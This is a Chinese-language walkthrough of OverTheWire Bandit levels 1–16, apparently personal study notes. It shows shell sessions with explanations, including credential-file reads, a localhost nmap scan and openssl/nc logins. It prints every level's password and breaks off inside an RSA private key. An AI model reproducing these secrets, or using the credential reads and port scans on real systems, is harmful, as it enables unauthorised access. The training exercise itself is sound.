## level1

```shell
bandit1@bandit:~$ ls -al
total 24
-rw-r-----   1 bandit2 bandit1   33 Oct 14 09:26 -
drwxr-xr-x   2 root    root    4096 Oct 14 09:26 .
drwxr-xr-x 150 root    root    4096 Oct 14 09:29 ..
-rw-r--r--   1 root    root     220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root    root    3851 Oct 14 09:19 .bashrc
-rw-r--r--   1 root    root     807 Mar 31  2024 .profile
```

`-`: 一般情况下，`-` 是不会被认为是文件名，在shell中，在选项前面添加 - ，还有`su -` 等。

如何解决：

```shell
cat < -
# < 标准输入，将文件读到标准输入，并用cat打印。
# 直接输入cat，按enter，就会进入标准输入，我们输入啥就打印啥，上面的命令就是利用了这一点。
cat ./-
# 读取当前目录的 - 文件。
263JGJPfgU6LtdEvgfWU1XP5yac29mFx
```

## level2

```shell
bandit2@bandit:~$ ls -al
total 24
drwxr-xr-x   2 root    root    4096 Oct 14 09:26 .
drwxr-xr-x 150 root    root    4096 Oct 14 09:29 ..
-rw-r--r--   1 root    root     220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root    root    3851 Oct 14 09:19 .bashrc
-rw-r--r--   1 root    root     807 Mar 31  2024 .profile
-rw-r-----   1 bandit3 bandit2   33 Oct 14 09:26 --spaces in this filename--
```

空格：在shell中被当作分隔符，如果我们要打印带有空格的文件，可以在文件名两边添加双引号，也可以用 \ 转义空格。

```
bandit2@bandit:~$ cat < --spaces\ in\ this\ filename--
MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx
bandit2@bandit:~$ cat < "--spaces in this filename--"
MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx
```

< 的作用：level1有说。

## level3

```shell
bandit3@bandit:~$ ls -al
total 24
drwxr-xr-x   3 root root 4096 Oct 14 09:26 .
drwxr-xr-x 150 root root 4096 Oct 14 09:29 ..
-rw-r--r--   1 root root  220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root root 3851 Oct 14 09:19 .bashrc
drwxr-xr-x   2 root root 4096 Oct 14 09:26 inhere
-rw-r--r--   1 root root  807 Mar 31  2024 .profile
bandit3@bandit:~$ cd inhere
bandit3@bandit:~/inhere$ ls -al
total 12
drwxr-xr-x 2 root    root    4096 Oct 14 09:26 .
drwxr-xr-x 3 root    root    4096 Oct 14 09:26 ..
-rw-r----- 1 bandit4 bandit3   33 Oct 14 09:26 ...Hiding-From-You
```

在shell中，文件名前面加`.`，变为隐藏文件，读取这种文件，前面加`./`，就可以读取这样的文件。

```shell
bandit3@bandit:~/inhere$ cat < ...Hiding-From-You
2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ
# .在标准输入中没有啥含义，所以这样也可以。
bandit3@bandit:~/inhere$ cat ./...Hiding-From-You
2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ
```

## level4

```shell
bandit4@bandit:~$ ls -al
total 24
drwxr-xr-x   3 root root 4096 Oct 14 09:26 .
drwxr-xr-x 150 root root 4096 Oct 14 09:29 ..
-rw-r--r--   1 root root  220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root root 3851 Oct 14 09:19 .bashrc
drwxr-xr-x   2 root root 4096 Oct 14 09:26 inhere
-rw-r--r--   1 root root  807 Mar 31  2024 .profile
bandit4@bandit:~$ cd inhere
bandit4@bandit:~/inhere$ ls -al
total 48
drwxr-xr-x 2 root    root    4096 Oct 14 09:26 .
drwxr-xr-x 3 root    root    4096 Oct 14 09:26 ..
-rw-r----- 1 bandit5 bandit4   33 Oct 14 09:26 -file00
-rw-r----- 1 bandit5 bandit4   33 Oct 14 09:26 -file01
-rw-r----- 1 bandit5 bandit4   33 Oct 14 09:26 -file02
-rw-r----- 1 bandit5 bandit4   33 Oct 14 09:26 -file03
-rw-r----- 1 bandit5 bandit4   33 Oct 14 09:26 -file04
-rw-r----- 1 bandit5 bandit4   33 Oct 14 09:26 -file05
-rw-r----- 1 bandit5 bandit4   33 Oct 14 09:26 -file06
-rw-r----- 1 bandit5 bandit4   33 Oct 14 09:26 -file07
-rw-r----- 1 bandit5 bandit4   33 Oct 14 09:26 -file08
-rw-r----- 1 bandit5 bandit4   33 Oct 14 09:26 -file09
```

存放密码的文件肯定是普通文件，而且文件类型一定是ascii text，我们只需要在当前文件夹寻找这种文件即可。

```shell
bandit4@bandit:~/inhere$ find . -type f -exec file {} \; | grep -i "ascii"
./-file07: ASCII text
# -type f 寻找普通文件
# -exec file {} \; 找到目标后，查看文件类型
# -i 不区分大小写
bandit4@bandit:~/inhere$ cat ./-file07
4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw
```

## level5(有些命令忘了)

一些参数忘了，今天做完，后面再复习复习。

```shell
bandit5@bandit:~$ ls -al
total 24
drwxr-xr-x   3 root root    4096 Oct 14 09:26 .
drwxr-xr-x 150 root root    4096 Oct 14 09:29 ..
-rw-r--r--   1 root root     220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root root    3851 Oct 14 09:19 .bashrc
drwxr-x---  22 root bandit5 4096 Oct 14 09:26 inhere
-rw-r--r--   1 root root     807 Mar 31  2024 .profile
bandit5@bandit:~$ cd inhere
bandit5@bandit:~/inhere$ ls -al
total 88
drwxr-x--- 22 root bandit5 4096 Oct 14 09:26 .
drwxr-xr-x  3 root root    4096 Oct 14 09:26 ..
drwxr-x---  2 root bandit5 4096 Oct 14 09:26 maybehere00
drwxr-x---  2 root bandit5 4096 Oct 14 09:26 maybehere01
drwxr-x---  2 root bandit5 4096 Oct 14 09:26 maybehere02
drwxr-x---  2 root bandit5 4096 Oct 14 09:26 maybehere03
drwxr-x---  2 root bandit5 4096 Oct 14 09:26 maybehere04
drwxr-x---  2 root bandit5 4096 Oct 14 09:26 maybehere05
drwxr-x---  2 root bandit5 4096 Oct 14 09:26 maybehere06
drwxr-x---  2 root bandit5 4096 Oct 14 09:26 maybehere07
drwxr-x---  2 root bandit5 4096 Oct 14 09:26 maybehere08
drwxr-x---  2 root bandit5 4096 Oct 14 09:26 maybehere09
drwxr-x---  2 root bandit5 4096 Oct 14 09:26 maybehere10
drwxr-x---  2 root bandit5 4096 Oct 14 09:26 maybehere11
drwxr-x---  2 root bandit5 4096 Oct 14 09:26 maybehere12
drwxr-x---  2 root bandit5 4096 Oct 14 09:26 maybehere13
drwxr-x---  2 root bandit5 4096 Oct 14 09:26 maybehere14
drwxr-x---  2 root bandit5 4096 Oct 14 09:26 maybehere15
drwxr-x---  2 root bandit5 4096 Oct 14 09:26 maybehere16
drwxr-x---  2 root bandit5 4096 Oct 14 09:26 maybehere17
drwxr-x---  2 root bandit5 4096 Oct 14 09:26 maybehere18
drwxr-x---  2 root bandit5 4096 Oct 14 09:26 maybehere19
bandit5@bandit:~/inhere$ find . -type f -size 1033c ! -exectuable -exec file {} \; |grep -i "ascii"
find: unknown predicate `-exectuable'
bandit5@bandit:~/inhere$ find . -type f -size 1033c ! -executable -exec file {} \; |grep -i "ascii"
./maybehere07/.file2: ASCII text, with very long lines (1000)
bandit5@bandit:~/inhere$ cat ./maybehere07/.file2
HWasnPhtq9AVKe0dmk45nxy20cvUa6EG
```

## level6

```shell
bandit6@bandit:~$ ls -al
total 20
drwxr-xr-x   2 root root 4096 Oct 14 09:25 .
drwxr-xr-x 150 root root 4096 Oct 14 09:29 ..
-rw-r--r--   1 root root  220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root root 3851 Oct 14 09:19 .bashrc
-rw-r--r--   1 root root  807 Mar 31  2024 .profile
bandit6@bandit:~$ find / -user bandit7 -group bandit6 -size 33c 2>/dev/null
/var/lib/dpkg/info/bandit7.password
bandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password
morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj
# -user bandit7 寻找文件所属者为bandit7的文件
# -group bandit6 寻找文件所所属者为bandit6的文件
# -size 33c 寻找文件大小为33字节的文件
```

## level7

```shell
bandit7@bandit:~$ ls -al
total 4108
drwxr-xr-x   2 root    root       4096 Oct 14 09:26 .
drwxr-xr-x 150 root    root       4096 Oct 14 09:29 ..
-rw-r--r--   1 root    root        220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root    root       3851 Oct 14 09:19 .bashrc
-rw-r-----   1 bandit8 bandit7 4184396 Oct 14 09:26 data.txt
-rw-r--r--   1 root    root        807 Mar 31  2024 .profile
bandit7@bandit:~$ cat data.txt | grep "millionth"
millionth       dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc
```

## level8(有些命令忘了)

```shell
bandit8@bandit:~$ ls -al
total 56
drwxr-xr-x   2 root    root     4096 Oct 14 09:26 .
drwxr-xr-x 150 root    root     4096 Oct 14 09:29 ..
-rw-r--r--   1 root    root      220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root    root     3851 Oct 14 09:19 .bashrc
-rw-r-----   1 bandit9 bandit8 33033 Oct 14 09:26 data.txt
-rw-r--r--   1 root    root      807 Mar 31  2024 .profile
bandit8@bandit:~$ sort data.txt | uniq -u
4CKMh1JI91bUIZZPXDqGanal4xvAg0JM
# -u 输出 不重复的
# sort 按字母排序
# uniq 处理重复行
```

## level9

```shell
bandit9@bandit:~$ ls -al
total 40
drwxr-xr-x   2 root     root     4096 Oct 14 09:25 .
drwxr-xr-x 150 root     root     4096 Oct 14 09:29 ..
-rw-r--r--   1 root     root      220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root     root     3851 Oct 14 09:19 .bashrc
-rw-r-----   1 bandit10 bandit9 19382 Oct 14 09:25 data.txt
-rw-r--r--   1 root     root      807 Mar 31  2024 .profile
bandit9@bandit:~$ strings data.txt |grep "==="
========== the
========== password
E========== is
5========== FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey
```

## level10

```shell
bandit10@bandit:~$ ls -al
total 24
drwxr-xr-x   2 root     root     4096 Oct 14 09:25 .
drwxr-xr-x 150 root     root     4096 Oct 14 09:29 ..
-rw-r--r--   1 root     root      220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root     root     3851 Oct 14 09:19 .bashrc
-rw-r-----   1 bandit11 bandit10   69 Oct 14 09:25 data.txt
-rw-r--r--   1 root     root      807 Mar 31  2024 .profile
bandit10@bandit:~$ base64 -d data.txt
The password is dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr
```

## level11(需要再次重做)

```shell
bandit11@bandit:~$ ls -al
total 24
drwxr-xr-x   2 root     root     4096 Oct 14 09:25 .
drwxr-xr-x 150 root     root     4096 Oct 14 09:29 ..
-rw-r--r--   1 root     root      220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root     root     3851 Oct 14 09:19 .bashrc
-rw-r-----   1 bandit12 bandit11   49 Oct 14 09:25 data.txt
-rw-r--r--   1 root     root      807 Mar 31  2024 .profile
bandit11@bandit:~$ cat data.txt | tr "a-mn-zA-MN-Z" "n-za-mN-ZA-M"
The password is 7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4
# tr 主要用于字符的替换
# tr 被替换的字符 将要被替换为的字符 
```

## level12

```shell
bandit12@bandit:~$ ls -al
total 24
drwxr-xr-x   2 root     root     4096 Oct 14 09:26 .
drwxr-xr-x 150 root     root     4096 Oct 14 09:29 ..
-rw-r--r--   1 root     root      220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root     root     3851 Oct 14 09:19 .bashrc
-rw-r-----   1 bandit13 bandit12 2581 Oct 14 09:26 data.txt
-rw-r--r--   1 root     root      807 Mar 31  2024 .profile
bandit12@bandit:~$ file data.txt
data.txt: ASCII text
bandit12@bandit:~$ cat data.txt
00000000: 1f8b 0808 2817 ee68 0203 6461 7461 322e  ....(..h..data2.
00000010: 6269 6e00 013c 02c3 fd42 5a68 3931 4159  bin..<...BZh91AY
00000020: 2653 59cc 46b5 2d00 0018 ffff da5f e6e3  &SY.F.-......_..
00000030: 9fcd f59d bc69 ddd7 f7ff a7e7 dbdd b59f  .....i..........
00000040: fff7 cfdd ffbf bbdf ffff ff5e b001 3b58  ...........^..;X
00000050: 2406 8000 00d0 6834 6234 d000 6869 9000  $.....h4b4..hi..
00000060: 1a7a 8003 40d0 01a1 a006 8188 340d 1a68  .z..@.......4..h
00000070: d340 d189 e906 8f41 0346 4d94 40d1 91a0  .@.....A.FM.@...
00000080: 681a 0681 a068 0680 c400 3207 a269 a189  h....h....2..i..
00000090: a326 8000 c800 c81a 1883 1000 00d0 c023  .&.............#
000000a0: 4311 a034 30ca 6800 0680 0681 a680 6868  C..40.h.......hh
000000b0: d068 6868 c04c d400 0003 4d06 87a8 d000  .hhh.L....M.....
000000c0: 3086 8c20 3268 068d 000c 9a64 0698 8d04  0.. 2h.....d....
000000d0: 0600 6860 3541 2c85 c8e1 7bc9 479e e369  ..h`5A,...{.G..i
000000e0: 30a1 0250 82e9 64ef 9d40 312f 4bc8 b00f  0..P..d..@1/K...
000000f0: 0c8f 026c d5ca 1008 d7aa 336a ed8f bb7b  ...l......3j...{
00000100: b43f d544 1658 824e a4af 9ce5 612e 8a27  .?.D.X.N....a..'
00000110: c303 0512 cbff dccd f42d 6866 ceec 8127  .........-hf...'
00000120: 5475 ed39 100b f897 7828 46e2 fdf3 efa7  Tu.9....x(F.....
00000130: 43b0 1701 a114 397a 1d81 8d1f 1f23 2ada  C.....9z.....#*.
00000140: 9b18 ee4d d05d 4ae3 d032 e494 ae98 27b0  ...M.]J..2....'.
00000150: 30a0 533c 6696 60ad c546 70c4 322b 7174  0.S<f.`..Fp.2+qt
00000160: 8bb1 52c6 ed0a 267b 7165 208b 77fe 1294  ..R...&{qe .w...
00000170: 2280 3311 354f c68e e004 93e3 abf4 5a0a  ".3.5O........Z.
00000180: a568 c894 27c2 9015 49bb 0147 c253 8e73  .h..'...I..G.S.s
00000190: 2fdd 90e1 6871 c692 1d67 5ebc a5f9 b8a1  /...hq...g^.....
000001a0: 3913 f073 1919 b628 9ae2 c1bf 15ee 493a  9..s...(......I:
000001b0: e375 4d23 71e0 4934 c7a2 15ff 985c a0ba  .uM#q.I4.....\..
000001c0: 9e65 d613 313d 7cef 512a 32bf 835e 50d6  .e..1=|.Q*2..^P.
000001d0: a54f 57ba bceb 6944 03c8 8a50 3542 9140  .OW...iD...P5B.@
000001e0: eb51 0f4c 8a23 9401 0246 0457 d1c0 c33e  .Q.L.#...F.W...>
000001f0: c328 2de7 3d1d 64be 4190 36b0 b803 4f80  .(-.=.d.A.6...O.
00000200: 40bc 3960 ac5e 13a9 3a77 0162 d662 7659  @.9`.^..:w.b.bvY
00000210: fdfd 9535 1188 8588 e8e5 a78d 9b24 c066  ...5.........$.f
00000220: 91c6 4212 fac6 4ed8 ce48 161f cc44 215f  ..B...N..H...D!_
00000230: 330c 5ed7 2709 e578 6efd 3775 c703 8aa1  3.^.'..xn.7u....
00000240: 10b6 2c5d 16bf f352 c7ff c5dc 914e 1424  ..,]...R.....N.$
00000250: 3311 ad4b 40d0 18b2 373c 0200 00         3..K@...7<...
bandit12@bandit:~$ xxd -r data.txt > data
-bash: data: Permission denied
bandit12@bandit:~$ ls -al
total 24
drwxr-xr-x   2 root     root     4096 Oct 14 09:26 .
drwxr-xr-x 150 root     root     4096 Oct 14 09:29 ..
-rw-r--r--   1 root     root      220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root     root     3851 Oct 14 09:19 .bashrc
-rw-r-----   1 bandit13 bandit12 2581 Oct 14 09:26 data.txt
-rw-r--r--   1 root     root      807 Mar 31  2024 .profile
bandit12@bandit:~$ mktemp -u
/tmp/tmp.S8kG2rd8lh
bandit12@bandit:~$ xxd -r data.txt > /tmp/tmp.S8kG2rd8lh/
-bash: /tmp/tmp.S8kG2rd8lh/: Is a directory
bandit12@bandit:~$ xxd -r data.txt > /tmp/tmp.S8kG2rd8lh/data
-bash: /tmp/tmp.S8kG2rd8lh/data: No such file or directory
bandit12@bandit:~$ mktemp -u /tmp/XXX
/tmp/Ls6
bandit12@bandit:~$ cd /tmp/Ls6
-bash: cd: /tmp/Ls6: No such file or directory
bandit12@bandit:~$ cd /tmp
bandit12@bandit:/tmp$ cd Ls6
-bash: cd: Ls6: No such file or directory
bandit12@bandit:/tmp$ ls -al
ls: cannot open directory '.': Permission denied
bandit12@bandit:/tmp$ mkdit /tmp/123
Command 'mkdit' not found, did you mean:
  command 'mkdist' from deb libmodule-package-rdf-perl (0.014-2)
  command 'mkdic' from deb canna-utils (3.7p3-20)
  command 'mkdir' from deb coreutils (9.4-3ubuntu6.1)
Try: apt install <deb name>
bandit12@bandit:/tmp$ mkdir /tmp/123
bandit12@bandit:/tmp$ cd 123
bandit12@bandit:/tmp/123$ xxd -r ~/data.txt > ./data
bandit12@bandit:/tmp/123$ ls -al
total 11080
drwxrwxr-x 2 bandit12 bandit12     4096 Mar 21 14:10 .
drwxrwx-wt 1 root     root     11325440 Mar 21 14:10 ..
-rw-rw-r-- 1 bandit12 bandit12      605 Mar 21 14:10 data
bandit12@bandit:/tmp/123$ file data
data: gzip compressed data, was "data2.bin", last modified: Tue Oct 14 09:26:00 2025, max compression, from Unix, original size modulo 2^32 572
bandit12@bandit:/tmp/123$ gizp -d data
Command 'gizp' not found, did you mean:
  command 'gimp' from snap gimp (3.0.6)
  command 'gzip' from deb gzip (1.12-1ubuntu3.1)
  command 'gimp' from deb gimp (2.10.36-3ubuntu0.24.04.1)
See 'snap info <snapname>' for additional versions.
bandit12@bandit:/tmp/123$ gzip -d data
gzip: data: unknown suffix -- ignored
bandit12@bandit:/tmp/123$ mv data data.gz
bandit12@bandit:/tmp/123$ gzip -d data.gz
bandit12@bandit:/tmp/123$ ls -al
total 11080
drwxrwxr-x 2 bandit12 bandit12     4096 Mar 21 14:11 .
drwxrwx-wt 1 root     root     11325440 Mar 21 14:11 ..
-rw-rw-r-- 1 bandit12 bandit12      572 Mar 21 14:10 data
bandit12@bandit:/tmp/123$ file data
data: bzip2 compressed data, block size = 900k
bandit12@bandit:/tmp/123$ mv data data.bz2
bandit12@bandit:/tmp/123$ bzip2 -d data.bz2
bandit12@bandit:/tmp/123$ ;s -al
-bash: syntax error near unexpected token `;'
bandit12@bandit:/tmp/123$ ls -al
total 11080
drwxrwxr-x 2 bandit12 bandit12     4096 Mar 21 14:13 .
drwxrwx-wt 1 root     root     11325440 Mar 21 14:13 ..
-rw-rw-r-- 1 bandit12 bandit12      434 Mar 21 14:10 data
bandit12@bandit:/tmp/123$ file data
data: gzip compressed data, was "data4.bin", last modified: Tue Oct 14 09:26:00 2025, max compression, from Unix, original size modulo 2^32 20480
bandit12@bandit:/tmp/123$ mv data data.gz
bandit12@bandit:/tmp/123$ gzip -d data.gz
bandit12@bandit:/tmp/123$ ls -al
total 11096
drwxrwxr-x 2 bandit12 bandit12     4096 Mar 21 14:14 .
drwxrwx-wt 1 root     root     11325440 Mar 21 14:14 ..
-rw-rw-r-- 1 bandit12 bandit12    20480 Mar 21 14:10 data
bandit12@bandit:/tmp/123$ file data
data: POSIX tar archive (GNU)
bandit12@bandit:/tmp/123$ tar xf data
bandit12@bandit:/tmp/123$ ls -al
total 11108
drwxrwxr-x 2 bandit12 bandit12     4096 Mar 21 14:14 .
drwxrwx-wt 1 root     root     11325440 Mar 21 14:14 ..
-rw-rw-r-- 1 bandit12 bandit12    20480 Mar 21 14:10 data
-rw-r--r-- 1 bandit12 bandit12    10240 Oct 14 09:26 data5.bin
bandit12@bandit:/tmp/123$ file data5.bin
data5.bin: POSIX tar archive (GNU)
bandit12@bandit:/tmp/123$ tar xf data5.bin
bandit12@bandit:/tmp/123$ ls -al
total 11112
drwxrwxr-x 2 bandit12 bandit12     4096 Mar 21 14:15 .
drwxrwx-wt 1 root     root     11325440 Mar 21 14:15 ..
-rw-rw-r-- 1 bandit12 bandit12    20480 Mar 21 14:10 data
-rw-r--r-- 1 bandit12 bandit12    10240 Oct 14 09:26 data5.bin
-rw-r--r-- 1 bandit12 bandit12      219 Oct 14 09:26 data6.bin
bandit12@bandit:/tmp/123$ file data6.bin
data6.bin: bzip2 compressed data, block size = 900k
bandit12@bandit:/tmp/123$ mv data6.bin data6.bz2
bandit12@bandit:/tmp/123$ ls -al
total 11112
drwxrwxr-x 2 bandit12 bandit12     4096 Mar 21 14:15 .
drwxrwx-wt 1 root     root     11325440 Mar 21 14:16 ..
-rw-rw-r-- 1 bandit12 bandit12    20480 Mar 21 14:10 data
-rw-r--r-- 1 bandit12 bandit12    10240 Oct 14 09:26 data5.bin
-rw-r--r-- 1 bandit12 bandit12      219 Oct 14 09:26 data6.bz2
bandit12@bandit:/tmp/123$ bzip2 -d data6.bz2
bandit12@bandit:/tmp/123$ ls -al
total 11120
drwxrwxr-x 2 bandit12 bandit12     4096 Mar 21 14:16 .
drwxrwx-wt 1 root     root     11325440 Mar 21 14:16 ..
-rw-rw-r-- 1 bandit12 bandit12    20480 Mar 21 14:10 data
-rw-r--r-- 1 bandit12 bandit12    10240 Oct 14 09:26 data5.bin
-rw-r--r-- 1 bandit12 bandit12    10240 Oct 14 09:26 data6
bandit12@bandit:/tmp/123$ file data6
data6: POSIX tar archive (GNU)
bandit12@bandit:/tmp/123$ tar xf data6
bandit12@bandit:/tmp/123$ ls -al
total 11124
drwxrwxr-x 2 bandit12 bandit12     4096 Mar 21 14:16 .
drwxrwx-wt 1 root     root     11325440 Mar 21 14:16 ..
-rw-rw-r-- 1 bandit12 bandit12    20480 Mar 21 14:10 data
-rw-r--r-- 1 bandit12 bandit12    10240 Oct 14 09:26 data5.bin
-rw-r--r-- 1 bandit12 bandit12    10240 Oct 14 09:26 data6
-rw-r--r-- 1 bandit12 bandit12       79 Oct 14 09:26 data8.bin
bandit12@bandit:/tmp/123$ file data8.bin
data8.bin: gzip compressed data, was "data9.bin", last modified: Tue Oct 14 09:26:00 2025, max compression, from Unix, original size modulo 2^32 49
bandit12@bandit:/tmp/123$ mv data8.bin data8.gz
bandit12@bandit:/tmp/123$ ls -al
total 11124
drwxrwxr-x 2 bandit12 bandit12     4096 Mar 21 14:17 .
drwxrwx-wt 1 root     root     11325440 Mar 21 14:17 ..
-rw-rw-r-- 1 bandit12 bandit12    20480 Mar 21 14:10 data
-rw-r--r-- 1 bandit12 bandit12    10240 Oct 14 09:26 data5.bin
-rw-r--r-- 1 bandit12 bandit12    10240 Oct 14 09:26 data6
-rw-r--r-- 1 bandit12 bandit12       79 Oct 14 09:26 data8.gz
bandit12@bandit:/tmp/123$ gzip -d data8.gz
bandit12@bandit:/tmp/123$ ls -al
total 11124
drwxrwxr-x 2 bandit12 bandit12     4096 Mar 21 14:17 .
drwxrwx-wt 1 root     root     11325440 Mar 21 14:17 ..
-rw-rw-r-- 1 bandit12 bandit12    20480 Mar 21 14:10 data
-rw-r--r-- 1 bandit12 bandit12    10240 Oct 14 09:26 data5.bin
-rw-r--r-- 1 bandit12 bandit12    10240 Oct 14 09:26 data6
-rw-r--r-- 1 bandit12 bandit12       49 Oct 14 09:26 data8
bandit12@bandit:/tmp/123$ fiel data8
Command 'fiel' not found, did you mean:
  command 'field' from deb rheolef (7.2-3build3)
  command 'file' from deb file (1:5.45-2)
Try: apt install <deb name>
bandit12@bandit:/tmp/123$ file data8
data8: ASCII text
bandit12@bandit:/tmp/123$ cat data8
The password is FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn
```

## level13

```shell
warn@kali:~/Desktop$ scp -P 2220 bandit13@bandit.labs.overthewire.org:~/sshkey.private ./
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

backend: gibson-0
bandit13@bandit.labs.overthewire.org's password: 
sshkey.private                                               100% 1679     1.7KB/s   00:00    
                                                                                               
warn@kali:~/Desktop$ ssh -i ./sshkey.private bandit14@bandit.labs.overthewire.org -p 2220
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

backend: gibson-0
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0640 for './sshkey.private' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "./sshkey.private": bad permissions
bandit14@bandit.labs.overthewire.org's password: 

                                                                                               
warn@kali:~/Desktop$ ls-al 
ls-al: command not found
                                                                                               
warn@kali:~/Desktop$ ls -al
total 48
drwxr-xr-x  9 warn warn 4096 Mar 22 13:11 .
drwx------ 22 warn warn 4096 Mar 22 13:10 ..
drwxrwxr-x  2 warn warn 4096 Oct 14 17:04 app
drwxrwxr-x  4 warn warn 4096 Mar 22 13:06 code
drwxrwxr-x  7 warn warn 4096 Mar 15 16:03 .git
-rw-------  1 warn warn 2602 Mar  3 22:39 .iris_key
drwxrwxr-x  2 warn warn 4096 Mar 16 14:10 picture_steg
drwxrwxr-x  3 warn warn 4096 Mar 17 14:40 reports
-rw-rw-r--  1 warn warn  102 Mar 18 21:51 secretz.csv
-rw-r-----  1 warn warn 1679 Mar 22 13:11 sshkey.private
drwxrwxrwx  8 warn warn 4096 Mar 15 17:13 sstv
drwxrwxr-x  3 warn warn 4096 Oct 15 16:54 upload
                                                                                               
warn@kali:~/Desktop$ chmod 600 ./sshkey.private 
                                                                                               
warn@kali:~/Desktop$ ssh -i ./sshkey.private bandit14@bandit.labs.overthewire.org -p 2220
```

一般情况下，私钥要被设置为600权限，否则会报错。`scp` 用于传输文件，ssh的`-i`选项是指定ssh登陆时要用到的私钥。

## level14

```ssh
bandit14@bandit:~$ ls -al
total 24
drwxr-xr-x   3 root root 4096 Oct 14 09:26 .
drwxr-xr-x 150 root root 4096 Oct 14 09:29 ..
-rw-r--r--   1 root root  220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root root 3851 Oct 14 09:19 .bashrc
-rw-r--r--   1 root root  807 Mar 31  2024 .profile
drwxr-xr-x   2 root root 4096 Oct 14 09:26 .ssh
bandit14@bandit:~$ nc localhost 30000
13
Wrong! Please enter the correct current password.
123
bandit14@bandit:~$ cat /etc/bandit/bandit13
cat: /etc/bandit/bandit13: No such file or directory
bandit14@bandit:~$ cat /etc/bandit_pass/bandit13
cat: /etc/bandit_pass/bandit13: Permission denied
bandit14@bandit:~$ cat /etc/bandit_pass/bandit14
MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS
bandit14@bandit:~$ nc localhost 30000
^C
bandit14@bandit:~$ nc localhost 30000
MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS
Correct!
8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo
```

nc 连接端口时，ip 要和端口分开，中间不需要加 `:`。

## level15

```shell
bandit15@bandit:~$ echo "8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo" | openssl s_client -connect localhost:30001 -quiet
Can't use SSL_get_servername
depth=0 CN = SnakeOil
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN = SnakeOil
verify return:1
Correct!
kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx

```

通过SSL/TSL加密传输，openssl s_client 默认使用的就是加密就是SSL/TSL加密进行信息的传输。

## level16

```shell
bandit16@bandit:~$ nmap localhost -p 31000-32000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-22 06:10 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00016s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT      STATE SERVICE
31046/tcp open  unknown
31518/tcp open  unknown
31691/tcp open  unknown
31790/tcp open  unknown
31960/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.06 seconds
bandit16@bandit:~$ echo "kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx" | openssl s_client --connecct localhost:31046 -quiet
s_client: Unknown option: -connecct
s_client: Use -help for summary.
bandit16@bandit:~$ echo "kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx" | openssl s_client --connect localhost:31046 -quiet
4087F0F7FF7F0000:error:0A0000F4:SSL routines:ossl_statem_client_read_transition:unexpected message:../ssl/statem/statem_clnt.c:398:
bandit16@bandit:~$ echo "kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx" | openssl s_client --connect localhost:31518 -quiet
Can't use SSL_get_servername
depth=0 CN = SnakeOil
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN = SnakeOil
verify return:1
kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx
bandit16@bandit:~$ echo "kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx" | openssl s_client -connect localhost:31691 -quiet
4087F0F7FF7F0000:error:0A0000F4:SSL routines:ossl_statem_client_read_transition:unexpected message:../ssl/statem/statem_clnt.c:398:
bandit16@bandit:~$ echo "kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx" | openssl s_client -connect localhost:31790 -quiet
Can't use SSL_get_servername
depth=0 CN = SnakeOil
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN = SnakeOil
verify return:1
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
